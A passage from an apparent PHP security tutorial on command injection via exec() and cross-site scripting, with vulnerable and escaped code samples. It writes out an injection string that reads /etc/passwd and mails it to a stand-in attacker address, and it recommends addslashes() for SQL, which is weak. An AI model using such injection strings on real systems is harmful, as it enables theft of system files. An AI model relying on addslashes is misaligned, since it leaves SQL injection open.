```
<input type="text" name="filetype">
<input type="submit">
</form>
</body>
</html>
```

Now this may not seem the brightest thing but it may also not seem that terrible. The problem here is that no checking is done on the user input. Imagine what would happen if we were to set filetype in the form to "html; cat /etc/passwd | mail hacker@theirdomain.com"? We would first execute `ls *.html` as expected, and then execute `cat /etc/passwd | mail hacker@theirdomain.com`, thus e-mailing your /etc/passwd file to their e-mail address. Running the input through the `escapeshellarg()` function first can solve this problem. The code below shows this modification:

```
<?php
if (isset($_GET["filetype"]))
    exec("ls *." . escapeshellarg($_GET["filetype"]));
?>
```

```
<html>
<body>
<form method="get">
Search Directory for files of type:
<input type="text" name="filetype">
<input type="submit">
</form>
</body>
</html>
```

Using user input to create exec() statements is not the only place to be extra careful. Another place is when combining user input into SQL statements where similar attacks can occur. Take special care to escape SQL control characters using addslashes() and related functions.

# Cross-Site Scripting Vulnerabilities

When creating a bulletin board or something similar, where we display back any user input (it could even be a login where we echo back "Hello $username") we need look at cross-site scripting vulnerabilities. A cross-site scripting vulnerability is where the user can insert arbitrary HTML tags and code into a page via their input. Imagine the following little snippet of code:

```
<?php
if ($_GET['name'])
    echo("Hello " . $_GET['name']);
?>
```

If we were to call this script with the query string `?name=<script>Malicious Code</script>` we could insert any code we wanted. We could also include form, applet, object, and embed tags causing other things to be inserted into the code maliciously. PHP provides various functions to help avoid this vulnerability from affecting your scripts. To output any of the user input, ensure it is safe by using the function `htmlspecialchars()`. The following code is an altered version of the above, making it safe from cross-site scripting vulnerabilities: